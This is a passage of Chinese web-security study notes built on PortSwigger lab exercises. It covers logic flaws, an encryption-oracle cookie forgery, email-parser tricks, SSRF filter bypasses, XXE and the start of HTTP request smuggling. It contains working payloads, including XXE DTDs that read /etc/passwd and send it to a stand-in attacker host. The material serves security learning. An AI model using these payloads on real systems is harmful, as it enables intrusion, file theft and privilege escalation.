  * 实验示例，Authentication 状态机缺陷：服务器维护了一个状态机，假设用户登录的顺序为：输入账号密码、选择角色、进入账号主页，可能在内存或者 session 中维护了状态变量，但未作非法状态转换检测，用户登录后跳过选择角色步骤，直接强制访问 `/admin` 管理页面，服务器没有阻止并使用默认角色初始化用户状态，导致用户获取管理功能。 
    * 正常流程：`POST /login` → `GET /role-selector` → `POST /role-selector` → `GET /my-account`.
    * 攻击流程：`POST /login` → `GET /admin`（跳过中间的角色选择步骤）.
    * 根本原因：服务器没有在访问 `/admin` 时校验用户是否已经完成了角色选择。它错误地信任了“用户访问 `/admin` 就意味着他们已经完成了前面的步骤”。当这个假设不成立时，服务器会使用一个未初始化的默认状态，而这个状态恰好拥有过高的权限。



### 特定领域缺陷

示例实验一：反复利用不同优惠券减直到余额为零。





示例实验二：利用优惠券折扣购买礼品卡，再使用礼品卡，无限刷余额。





### 提供加密预言机

当用户可控的输入被加密，并且生成的密文以某种形式提供给用户。就可能出现危险的场景，被称为“encryption oracle(加密预言机)”（在密码学中，指一个能对任意输入返回加密结果的黑盒系统）。攻击者可以利用这个输入加密任意数据，当应用程序存在一个反向功能的可控输入，攻击者甚至能够解密其他数据识别结构。  



实验示例：

一个博客应用，登录界面有一个保持登录功能，如果勾选，会传递一个 stay-logged-in=on 参数：

```http
POST /login HTTP/2
Host: 0ac70027049ea2f680a3c17a00de003e.web-security-academy.net
Cookie: session=TFWkrJlgS9eTbtnRdLPha12l0RTZxNFL

...omit...

csrf=WKJ2oZS9bxbRpkjVMYhEGe4v0rYR4cfy&username=wiener&password=peter&stay-logged-in=on
```

返回的cookie 中则包含了 stay-logged-in 的条目，是一个加密字符串：

```http
HTTP/2 302 Found
Location: /my-account?id=wiener
Set-Cookie: stay-logged-in=c3rSmy2rF9W6EJfNGUiK0fBovK8PSlMb4OYV0wyn2j0%3d; Expires=Wed, 01 Jan 3000 01:00:00 UTC
Set-Cookie: session=S3Avf9a3bLwAnN5azuskchUVq7qQyNsY; Secure; HttpOnly; SameSite=None
... omit ...

```



在文章提交评论的接口，将评论内容以 POST 方法参数提交

```http
POST /post/comment HTTP/2
Host: 0ac70027049ea2f680a3c17a00de003e.web-security-academy.net
Cookie: stay-logged-in=c3rSmy2rF9W6EJfNGUiK0fBovK8PSlMb4OYV0wyn2j0%3d; session=S3Avf9a3bLwAnN5azuskchUVq7qQyNsY
Content-Length: 120

... omit ...

csrf=oRFcBXMXzfDCKBgYKbko0GxepdqQuh56&postId=6&comment=comment+content&name=title&email=a%40b.c&website=http%3A%2F%2Fd.e
```

正常返回：
```http
HTTP/2 302 Found
Location: /post/comment/confirmation?postId=6
X-Frame-Options: SAMEORIGIN
Content-Length: 0

```

如果填写错误邮箱地址，页面会提示：`Invalid email address: xxxxxx`，返回的 cookie 中包含了 notification，即加密后的通知内容，如果有 notification，例如上面邮箱格式错误，html 页面会根据下面 cookie  解码成明文`Invalid email address: wrong_address`。

```http
HTTP/2 302 Found
Location: /post?postId=6
Set-Cookie: notification=AFfitMYDEfxvYVJSKNG%2fbK58%2fJyS3dBtdLuag8x4zxQdHf2OEZ1pTbgXxDTRFjrP; HttpOnly
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

这个评论功能就属于加密预言机：

* 加密：将我们想要加密的字符串通过邮箱参数传递给此接口，返回的 cookie 中包含了加密字符串

* 解密：将符合格式的密文配置到 cookie 中的  notification 字段，请求对应文章页面，会展示在通知区域

  * 例如 

    ```http
    GET /post?postId=6 HTTP/2
    Host: 0ac70027049ea2f680a3c17a00de003e.web-security-academy.net
    Cookie: notification=AFfitMYDEfxvYVJSKNG%2fbK58%2fJyS3dBtdLuag8x4zxQdHf2OEZ1pTbgXxDTRFjrP; stay-logged-in=c3rSmy2rF9W6EJfNGUiK0fBovK8PSlMb4OYV0wyn2j0%3d; session=S3Avf9a3bLwAnN5azuskchUVq7qQyNsY
    ```

    

通过访问不同页面，可以发现服务端判断用户登录状态是基于 stay-logged-in 这个字段，尝试将这个字段作为参数 notification 的值以 url 形式解码后传递给解密页面：

```http
GET /post?postId=6 HTTP/2
Host: 0ac70027049ea2f680a3c17a00de003e.web-security-academy.net
Cookie: notification=c3rSmy2rF9W6EJfNGUiK0fBovK8PSlMb4OYV0wyn2j0=; stay-logged-in=c3rSmy2rF9W6EJfNGUiK0fBovK8PSlMb4OYV0wyn2j0%3d; session=S3Avf9a3bLwAnN5azuskchUVq7qQyNsY
```

得到结果是：

```html
<header class="notification-header">
    wiener:1789885263983                    
</header>
```

可以发现是`用户名:时间戳`的形式，如果可以解密`administrator:时间戳` 就可以以管理员身份登录管理页面。    

在评论功能的接口提交请求：

```http
POST /post/comment HTTP/2
Host: 0ac70027049ea2f680a3c17a00de003e.web-security-academy.net
Cookie: stay-logged-in=c3rSmy2rF9W6EJfNGUiK0fBovK8PSlMb4OYV0wyn2j0%3d; session=S3Avf9a3bLwAnN5azuskchUVq7qQyNsY

csrf=oRFcBXMXzfDCKBgYKbko0GxepdqQuh56&postId=6&comment=something&name=common_title&email=administrator:1789885263983&website=http%3A%2F%2Fd.e
```

获取结果：

```http
HTTP/2 302 Found
Location: /post?postId=6
Set-Cookie: notification=AFfitMYDEfxvYVJSKNG%2fbOIuzH%2bGCIgiEbuDSMt6xQ6%2fnJ%2fZ7OxcK9dOi4mwTniT9GEBBE1mbFfaPSos%2fchJaQ%3d%3d; HttpOnly
X-Frame-Options: SAMEORIGIN
Content-Length: 0

```

携带返回的 cookie 访问文章页面有 `Invalid email address: administrator: 1789885263983 ` 这样的通知，需要想办法将前面 23 个字符去除： 

```
Invalid email address: 
```

使用 burpsuite 的 decoder 解码，先 url 解码再 base64解码后去除前 23 个16进制字符

![image-20260920145018607](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260920145018607.png)

再将删除后字符串以 base64 加密：

![image-20260920145138583](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260920145138583.png)

得到：K9dOi4mwTniT9GEBBE1mbFfaPSos/chJaQ== ，将此值作为cookie的 notification 值请求文章页面，出现报错，提示这个值必须是填充为 16 的倍数：

```html
<h4>Internal Server Error</h4>
<p class=is-warning>Input length must be multiple of 16 when decrypting with padded cipher</p>
```



原先有23个字符再填充9个字符再次请求：

```http
POST /post/comment HTTP/2
Host: 0ac70027049ea2f680a3c17a00de003e.web-security-academy.net
Cookie: stay-logged-in=c3rSmy2rF9W6EJfNGUiK0fBovK8PSlMb4OYV0wyn2j0%3d; session=S3Avf9a3bLwAnN5azuskchUVq7qQyNsY
... omit ...

csrf=oRFcBXMXzfDCKBgYKbko0GxepdqQuh56&postId=6&comment=something&name=common_title&email=xxxxxxxxxadministrator:1789885263983&website=http%3A%2F%2Fd.e
```

响应：

```http
HTTP/2 302 Found
Location: /post?postId=6
Set-Cookie: notification=AFfitMYDEfxvYVJSKNG%2fbJT7KyI0%2bpuGBYTDG6sx8gd9KUO8KrTU%2f9d1nNa7WCBCPTNxpHb8gucK9fGm1vH3FQ%3d%3d; HttpOnly
X-Frame-Options: SAMEORIGIN
Content-Length: 0


```

将响应中字段再次拿到 decoder 中解码，这次去除前 32 位，之后再次 base64 加密，得到结果 `fSlDvCq01P/XdZzWu1ggQj0zcaR2/ILnCvXxptbx9xU=` 进行请求：

```http
GET /post?postId=6 HTTP/2
Host: 0ac70027049ea2f680a3c17a00de003e.web-security-academy.net
Cookie: notification=fSlDvCq01P/XdZzWu1ggQj0zcaR2/ILnCvXxptbx9xU=; stay-logged-in=c3rSmy2rF9W6EJfNGUiK0fBovK8PSlMb4OYV0wyn2j0%3d; session=S3Avf9a3bLwAnN5azuskchUVq7qQyNsY
```

页面通知内容变为：

```html
<header class="notification-header">
            administrator:1789885263983                    
</header>
```

说明解密程序能够正常识别并转换字符串，将加密字符串放到 `stay-logged-in` 字段，并删除 `session` 字段后请求 `/admin` URL，

![image-20260920151836212](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260920151836212.png)

可以成功进入管理页面。



### 邮件地址解析差异

参考：https://portswigger.net/research/splitting-the-email-atom

![img](../upload/2026-07-06-PortSwigger_BurpSuite/3665-article-how-encoded-word-works.png)

示例实验，必须使用 @ginandjuice.shop 后缀的内部邮箱才能注册，利用上面链接给出的方法：

尝试 utf8 编码报错：

```
=?utf-8?q?=61=62=63?=wiener@ginandjuice.shop
```

尝试utf7可以正常注册：

```
=?utf-7?q?&AGEAYgBj-?=foo@ginandjuice.shop
```

下面开始尝试利用邮件地址解析差异，将邮件发送到 exploit-server 中邮箱：

```
Q编码和utf7字符集：
=?utf-7?q?attacker&AEA-exploit-0a5f002003a244b780b9669a0130006f.exploit-server.net&ACA-?=@ginandjuice.shop

或者使用 base64 编码 utf7字符集混合：
=?utf-7?b?d2llbmVyJkFFQS1leHBsb2l0LTBhNWYwMDIwMDNhMjQ0Yjc4MGI5NjY5YTAxMzAwMDZmLmV4cGxvaXQtc2VydmVyLm5ldCZBQ0Et?=@ginandjuice.shop

```

可以正常收取到邮件。  



## 预防



* 确保开发人员、测试人员理解应用软件服务的领域
* 避免对用户或其它关联的应用程序的行为做出隐式假设



一些最佳实践：

* 为所有的交互和工作流，维护清晰的设计文档和数据交互流程图，注意其中各个步骤中做的任何假设。
* 尽可能写清晰易懂的代码。难以理解的代码，就难以注意到其中的逻辑漏洞。
* 注意每个使用的组件所引用的其它代码。考虑以恶意的方式操作这些依赖关系，可能产生的结果。





# Server-side request forgery(SSRF) 服务端请求伪造

服务端请求伪造漏洞是指攻击者可以通过服务器连接到非预期位置发起请求。可能连接到服务器所在基础设施内网，获取敏感数据，甚至某些场景下可以执行任意命令。  

通常是通过本地环回地址 127.0.0.1 、localhost 之类的地址发起请求。  



## 常见攻击



### 针对服务器本身

示例，一个购物程序向后端查询库存通过如下请求：

```http
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
```

服务器通过向指定 URL 请求并将结果返回给客户端，假如存在一个管理页面 /admin 仅允许本地访问，攻击者修改请求将获取该页面内容：

```http
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://localhost/admin
```



应用程序允许或者隐式地信任本地请求，主要出于以下常见原因：

* 访问控制位于应用程序前面地组件，应用程序设计、定位处于架构中可信任的位置
* 灾备原因，允许本地机器无认证情况下访问管理
* 管理系统与主应用程序使用不同端口，且未对外暴露

出与以上及类似的原因，应用程序服务器信任来自本地的请求，就导致了 SSRF  



### 针对其它后端系统

示例，内网管理系统为 http://192.168.0.68/admin ，允许来自局域网请求，攻击者就可以提交如下请求获取管理页面 ：

```http
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://192.168.0.68/admin
```





## 绕过常见防御

有些常见预防 SSRF 的手段也可以被绕过。  

### 黑名单输入过滤

一些应用使用黑名单阻止来自 `127.0.0.1` 、 `localhost` 之类的请求，或者敏感 URLs，下列方法可以进行尝试绕过：

* 其它代表 `127.0.0.1` 的形式，例如：十进制 `2130706433`、八进制 `017700000001` 、简写形式 `127.1`
* 注册自己的域名，配置解析为 `127.0.0.1` 
* 混杂不同编码字符串编码尝试绕过黑名单
* 尝试不同的协议，例如修改 http 为 https



### 白名单输入过滤

一些应用使用白名单，只允许匹配白名单中值的输入。但过滤器采用的算法不同，就会产生差异。URL 规范中包含的一些特性在实现或验证时会被忽视：

* 在主机名之前使用 `@` 符号嵌入凭证，例如  `https://expected-host:fakepassword@evil-host` 
* 使用 `#` 字符，例如 `https://evil-host#expected-host`
* 利用 DNS 解析，将匹配值以前缀形式放到解析中，例如 `https://expected-host.evil-host` 
* 对部分或全部字符进行 URL 编码，混淆解析，如果实现过滤器的代码处理 URL 和执行 HTTP 请求的代码不同会尤其有用。多重编码，有些服务器会递归解码收到的 URL，会导致差异



实验示例：  

过滤器拦截了 127.0.0.1 ，仅允许来自 `stock.weliketoshop.net` 的请求，尝试使用 `@` 可以接收没有返回拦截信息：

```http
http://username@stock.weliketoshop.net/
```

继续尝试加入 `#` 字符，提示被拦截，使用 URL 编码 `%23` 也被拦截，：

```http
http://localhost:80#@stock.weliketoshop.net/
```

再使用双重编码修改为 `%2523` 可以通过过滤器，其中 `%25` 为  `%` 的编码，加入后缀 URL 通过实验：

```http
http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
```





### 重定向跳转

一些应用中包含了重定向跳转，可能会被利用发起 SSRF，例如：`/product/nextProduct?currentProductId=6&path=http://evil-user.net` 跳转到 `http://evil-user.net`   

下面请求虽然是来自信任主机，但重定向跳转可能被篡改以访问其它内网应用：

```http
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
```

  



## 盲 SSRF

当应用程序被诱导发起 SSRF，但 SSRF 的响应内容不会返回到客户端，就属于盲 SSRF。  

盲 SSRF 通常的影响低于有响应的 SSRF，因为不能被利用检索数据，但有些情况下会被利用实现 RCE。  

### 发现

发现和检查盲 SSRF 比较有效的方法是使用 OAST ，尝试对外发起连接请求。  

在测试时有时会发现有对应 DNS 查询记录但没有后续请求，通常时因为应用程序尝试发起 HTTP 请求，主机发送了 DNS 查询，但后续 HTTP 被网络层过滤阻止了。很多时候基础设施层面允许 DNS 请求，但阻止 HTTP 请求。       

### 利用

能够触发一个带外 HTTP 请求的盲 SSRF 通常没有太多可利用的路径，但有时可以被利用进行内网探测，批量发送已知漏洞的 Payload，如果这些 Payload 可以被利用也发起 OAST 带外请求，就会被进一步利用来确认内网中存在漏洞的服务器。  

常见目标：

| 目标                | 探测方式                   | 可能发现的漏洞            |
| :------------------ | :------------------------- | :------------------------ |
| **内部 Web 服务器** | 发送 HTTP 请求到常见端口   | 未授权访问、默认凭证      |
| **Redis**           | 发送 `gopher://` Payload   | 未授权访问、写入 SSH 密钥 |
| **Elasticsearch**   | 发送 HTTP 请求到 9200 端口 | 未授权访问、数据泄露      |
| **Jenkins**         | 发送 HTTP 请求到 8080 端口 | 未授权访问、RCE           |
| **云元数据**        | 请求 `169.254.169.254`     | 获取云服务器凭证          |



## 寻找隐藏攻击面

很多 SSRF 漏洞比较容易找到，因为应用程序正常请求的完整 URL、参数会被记录。有一些场景下会隐藏的比较深，较难定位。

### Partial URLs in request 请求中的部分URL

有些应用将主机名或者 URL 路径的一部分放入请求参数，提交到后端服务。  



### URLs with data format 数据格式 中的 URL

一些应用使用规定的格式传输数据。请求的 URL 包含在这些格式的数据文件中。常见的有 XML、JSON 等，此时就容易收到注入攻击，例如  XXE。 



### SSRF via Referer header

一些应用出与跟踪、分析数据等原因会记录用户请求头中的 Referer 信息，如果分析软件会访问出现在该字段值的 URL，进一步记录站点内容等，就会被利用来 SSRF。  



## Payload cheat sheet

https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet





# XML external entity(XXE) injection XML外部实体注入



XXE 是一种攻击者可以干预到应用程序处理 XML 数据的漏洞。通常会导致攻击者查看应用服务器的文件系统、与应用服务器后端服务进行交互。一些场景下会扩大影响到后端底层服务器及其它基础设施，促使服务器发起 SSRF 攻击。  

这种漏洞产生的原因是由于应用程序几乎总是通过标准库或者平台 API 处理服务器上的 XML 数据，XML 相关标准中包含了多种潜在危险的特性，虽然这些特性很多应用用不到，但标准 XML 解析器会实现这些特性。  

XML 外部实体是一种自定义的 XML实体，其定义的值是从声明它们的 DTD 之外加载的，允许基于文件路径或者 URL 的内容定义一个实体。  



## XML entities

XML 全称是 "extensible markup language"，设计来存储或传输数据。如同 HTML，XML 使用标签和数据的树状结构，但不像HTML那样包含预定义标签，因此 tag 可以包含名称用来描述数据。早期 web 历史中很流行，但如今更多的应用使用 JSON 格式。  



### 内置实体

XML 实体是一种在 XML 文档中表示数据项的方式，不是数据本身。XML 规范中定义了一些内建的实体，例如 实体 `&lt` 和 `&gt` 分别表示字符 `<` 和 `>`，这些是用于表示 XML 标签的元字符，当他们出现在数据中时，通常必须使用它们的实体来表示。  

常见实体：

| 实体     | 表示的字符 | 用途                     |
| :------- | :--------- | :----------------------- |
| `&lt;`   | `<`        | 小于号（标签开始）       |
| `&gt;`   | `>`        | 大于号（标签结束）       |
| `&amp;`  | `&`        | 与符号（实体引用的开始） |
| `&quot;` | `"`        | 双引号（属性值边界）     |
| `&apos`  | `'`        | 单引号（属性值边界）     |

需要实体的原因：`<`、`>`、`&`、`"`、`'` 在 XML 中有特殊含义。当它们作为**数据**出现时，必须用实体表示，否则解析器会误以为它们是 XML 语法的一部分。

```
XML 文档：
<user>Tom & Jerry</user>
         ↑
    解析器看到 & 会认为这是实体的开始，但 & Jerry 不是合法实体
    → 解析错误

正确写法：
<user>Tom &amp; Jerry</user>
         ↑
    解析器看到 &amp; 会将其替换为 &
    → 正确解析
```



XML 文档类型定义(Document Type Definition,DTD)包含了一个 XML 中可以定义的结构、包含的数据值类型、其它项目的声明。 DTD 在文档开头的可选 `DOCTYPE` 元素内部中声明。DTD 可以包含在文档本身之内，被称为内部 DTD，也可以从外部加载，被称为外部 DTD，也可以是两者的混合体。  





### 自定义实体

XML 允许自定义实体，例如

```xml
<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>
```

上面定义的含义是：任何在此 xml 中引用 `&myentity;` 的地方会被替换为 `my entity value` 。



### 外部实体

XML 外部实体是指定义在 xml 外部的自定义实体类型。使用 `SYSTEM` 关键字并指定一个 URL 来声明外部自定义实体。     

示例：

```xml
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>
```

也可以使用 `file://` 形式从文件中加载外部自定义实体：

```xml
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>
```







## XXE 攻击类型

* 利用 XXE 获取文件，当一个外部实体的定义中包含文件内容，并从应用响应返回。
* 利用 XXE 执行 SSRF 攻击，当一个外部实体的定义基于 URL。
* 盲 XXE 通过带外网络携带数据，将敏感数据传输到攻击者的系统上。
* 盲 XXE 经过错误消息获取数据，攻击者可以触发一个解析错误消息，消息包含了敏感数据。



## 利用 XXE 获取文件

可以通过两种方式：

* 引入或者编辑 `DOCTYPE` 元素，其中定义的外部实体包含了文件路径。
* 编辑 XML 中定义的外部实体的值，返回给应用程序。



示例，假设一个商城应用检查库存是通过提交如下 xml 内容给服务端：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```

拦截并修改内容，加入新的 `DOCTYPE` 引用要获取的文件，并在后面进行引用，这里使用 `&xxe`：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

如果应用程序没有做任何防护，就会将文件内容包含在上下文中返回：

```
Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```





## 利用 XXE 执行 SSRF 攻击

如果应用程序中引用了 URL 的方式，就可以被利用来发起 SSRF。  

示例：

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```





## 盲 XXE

很多应用程序不会在 response 中包含定义的外部实体的值，这种场景下直接获取文件将行不通，但盲 XXE 还是能够被利用，有时需要结合一些带外技术或者导致触发解析错误的手段。

  

### 使用 OAST 探测盲 XXE

定义一个外部实体：

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
```

这个 XXE 攻击会导致服务器发起一个 HTTP 请求到攻击者可以掌控的地址，通过监控 DNS 解析记录和 HTTP 请求记录，能够探测盲 XXE 是否成功。  



有时 XXE 攻击使用的普通实体被输入验证或者 XML 解析器拦截，可以使用 XML 参数实体替代，`XML 参数实体` 是一种特殊类型的 XML 实体，只能被别处的 DTD 引用。  

首先在参数实体名前使用 `%` 字符声明一个参数实体：

```xml
<!ENTITY % myparameterentity "my parameter entity value" >
```

然后使用 `%` 字符引用：

```xml
%myparameterentity;
```

参数实体类型定义测试使用 OAST 来探测盲 XXE：

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```





### 利用盲 XXE 经 OAST 携带数据

 上一节是检测盲 XXE 漏洞，攻击者真正想要利用该盲 XXE 漏洞外泄敏感数据，还需要一些步骤，要在攻击者控制的系统上放置一个恶意 DTD，然后从带内 XXE Payload 中调用该外部 DTD。  

示例 DTD：

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

上面 DTD 执行如下动作：

* 定义一个参数实体 file，包含文件 /etc/passwd
* 定义一个参数实体 eval，包含一个动态声明的参数实体 exfiltrate，exfiltrate 引用一个 URL，URL中包含了上一步定义的 file 内容
* 使用 eval 实体，触发动态参数实体 exfiltrate 被执行
* 使用 exfiltrate 实体，触发请求指定的 URL

然后攻击者会放置恶意的 DTD 到他们控制的 web 主机上，例如：

```xml
http://web-attacker.com/malicious.dtd
```

最后攻击者提交 XXE Payload 到应用程序：

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
```

这个 Payload 声明一个名为 xxe 的参数实体，然后在 DTD 中使用。这会导致 XML 解析并从攻击者提供的服务器获取外部 DTD 并内联解释，恶意 DTD 中定义的步骤随后被执行，文件内容被传输到攻击者服务器。  

不过需要注意的是，在很多有换行的文件中可能无法利用，此时可以尝试 FTP 等协议替代 HTTP 或者更换尝试读取单行的文件。  



DTD 中一些替代的字符编码

| 原始字符 | 编码后   | 原因                                   |
| :------- | :------- | :------------------------------------- |
| `%`      | `&#x25;` | 在实体值中不能直接使用 `%`             |
| `&`      | `&#x26;` | 在实体值中不能直接使用 `&`             |
| `'`      | `&#x27;` | 在单引号包裹的实体值中不能直接使用 `'` |

**为什么需要这些编码？**

- 在 DTD 中，实体值本身是被引号包裹的字符串。
- 如果字符串中需要包含 `%`、`&`、`'` 等特殊字符，必须使用 HTML 实体编码，否则会被解析器提前解释。









### 盲 XXE 经错误消息获取数据

有些时候应用程序没有在 response 中返回文件数据，但 XML 解析错误消息中可能会包含文件数据，如果 response 中包含错误消息就可以被利用来获取数据。  

示例，一个恶意 DTD：

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

行为如下：

* 定义一个参数实体 file，包含 /etc/passwd 文件
* 定义一个参数实体 eval，包含一个动态声明的外部参数实体 error，引用了不存在的路径和 file 实体的内容
* 使用 eval，触发动态声明的 error 实体被触发
* 使用 error 实体，触发文件不存在的错误解析消息中将包含 file 引用的 /etc/passwd 文件内容

调用上面的恶意外部 DTD，可能会获取如下类似消息：

```
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```





### 利用本地 DTD 

很多时候无法调用外部 DTD，但如果知道目标服务器上存在一些已知的 DTD，这些 DTD 就可以被利用。  

假设服务器有一个 DTD ：`/usr/local/app/schema.dtd` ，定义了一个实体 `custom_entity` ，攻击者就可以通过如下包含 /etc/passwd 文件的 Payload 触发错误消息：

```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

* 定义了一个参数实体 local_dtd，引用本地已存在的 DTD `/usr/local/app/schema.dtd` 
* 重新定义了该 DTD 中已存在的 custom_entity 实体，触发了包含 /etc/passwd 内容上下文的错误消息
* 使用 local_dtd 实体，外部 DTD 被解释，包含了重定义的 custom_entity 的值，这就导致产生错误消息



**定位一个可利用的本地 DTD 文件**   

这种 XXE 攻击的一个关键点就是利用文件系统上现有的 DTD，需要有一些方法探测和定位这些 DTD 文件。  

例如使用 GNOME 桌面环境的通常存在： `/usr/share/yelp/dtd/docbookx.dtd` 这样一个 DTD 文件。  

使用如下 XXE Payload 可以探测该文件是否存在：

```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```

如果文件缺失将导致一个错误，当定位一个确定存在的 DTD 以后，可以尝试从网上其它途径获取此路径文件下 DTD 定义的内容，很多 DTD 都是开源软件中定义和使用的。  



## 找到隐藏攻击面

如果应用程序正常在 HTTP 流量中包含 XML 数据，这种场景如果存在 XXE 将会比较明显。但有些场景不是像这样明显的交互。  

### XInclude 攻击

有些场景下应用程序接收到客户端数据之后，在服务端才嵌入到一个 XML 文档中，然后进行解析。例如客户端提交的数据存放到一个后端 SOAP 请求中，由后端 SOAP 服务处理。  

这种场景下前面的 XXE 攻击将不可用，因为无法控制整个 XML，也就无法定义或修改 `DOCTYPE` 元素。但可以使用 `XInclude` 元素代替，`XInclude` 元素是 XML 规范的一部分，允许从子文档构建 XML 文档，这样就可以将 XInclude 文档攻击放置在任何 XML 文档的任何数据中，因此可以在你提交的单个数据项情况下提交。  

示例，需要先引入 XInclude 命名空间，并提供希望包含的文件路径：

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```



### 通过文件上传进行 XXE

一些应用程序允许用户上传文件，然后在服务端处理。有一些常见的文件格式使用或包含了 XML 文档格式，例如 DOCX、SVG。  

这样就可以利用来上传包含恶意 DTD 的文件，从而找到 XXE 攻击面。   



### 修改上下文类型

大多数 POST 请求使用 HTML 表单生成的默认类型，例如 `application/x-www-form-urlencoded` ，有些网站会允许其它内容类型，例如 XML。  

示例，一个 http 请求如下：

```http
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```

修改成如下类型：

```http
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```

如果应用程序允许并解析消息体中的 xml 内容，就可以尝试找到 XXE 攻击面。  



### 快速发现和测试 XXE 漏洞

大多数 XXE 可以使用 web 漏洞扫描器发现。  

手工测试 XXE 漏洞，通常涉及：

* 基于一个已知操作系统文件定义外部实体，并在应用程序中使用该实体，测试和检索文件
* 通过监控你控制的 URL 外部实体相关 DNS、HTTP 请求，盲测 XXE 漏洞
* 使用 XInclude 攻击尝试检索已知操作系统文件，测试用户提供的非 XML 格式数据在服务端 XML 文档处理存在的漏洞



需要注意的是有时要使用 XML 转义编码 Payload，避免破坏 XML 语法。XML 只是一种数据传输格式，除了 XXE 还可以尝试 XSS 、SQL 注入等漏洞。  



## 预防

禁用那些用不到的 XML 危险特性，通常禁用外部实体解析和对 XInclude 的支持就足够，参考每种实现库和API的文档。





# HTTP Request Smuggling (HTTP 请求走私)



## 概念

HTTP 请求走私是一种干涉web服务器处理正常用户发起的 HTTP 请求序列的技术，攻击者可能穿过安全机制，访问到未授权的敏感数据。  主要与 HTTP/1 有关。   

目前存在很广泛的web服务架构，是前端服务器转发 HTTP 请求到后端服务器，出于性能和效率的考虑，很多前端服务器会通过一个连接发送多个请求，后端服务器通过协议标识区分不同的请求。  

![image-20261009144147175](../upload/2026-07-06-PortSwigger_BurpSuite/image-20261009144147175.png)

关键在于请求的分割界限，攻击者可能发送一个模糊的请求扰乱前后端原先各个 HTTP 请求的正常分割，这就可能导致严重的后果：

![image-20261009144438007](../upload/2026-07-06-PortSwigger_BurpSuite/image-20261009144438007.png)







大多数 HTTP 请求走私产生的原因是  HTTP/1 中提供了两种标记 request 结束的 header ：`Content-Length` 和 `Transfer-Encoding` 。  

`Content-Length` 直接声明消息体的大小：

```http
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

`Transfer-Encoding` 头可以声明消息体使用 chunked encoding(分块编码)，这样消息体中就包含多个数据块，每个块以字节为单位表示大小，跟一个换行符，再跟块内容。消息以一个大小为0的块终止，例如：

```http
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

b
q=smuggling
0
```

HTTP/1 中提供了两种不同的方法声明消息的长度，但一条消息中可能同时使用了两种方法，这样就产生了冲突。为了预防这个问题，两者同时存在时，`Content-Length` header 会被忽略。这样在单台服务器的情况下会避免歧义，但是在两台以上仍然可能存在该问题，主要原因有：

* 一些服务器不支持 `Transfer-Encoding` header
* 一些服务器虽然支持 `Transfer-Encoding`，但在含义不清的情况下不做处理

前后端之间对  `Transfer-Encoding` header 的处理存在差异，分割符差异导致请求走私。  



一些缩写：

```
CL (Content-Length)
TE (Transfer-Encoding)
0 (Implicit-zero)
H2 (HTTP/2's built-in length)
```







## 执行攻击

经典的请求走私攻击会在单个 HTTP/1 的请求中包含 `Content-Length` 和 `Transfer-Encoding` 两种 header ，控制他们进而导致前后端处理请求的差异，具体的方式取决于前后端服务器的差异，下面 CL 、TE 分别代表两种 header：

* CL.TE：前端使用 CL，后端使用TE
* TE.CL：前端使用 TE，后端使用 CL
* TE.TE：前端、后端都是用 TE



### CL.TE



```http
POST / HTTP/1.1
Host: vulnerable-website.com
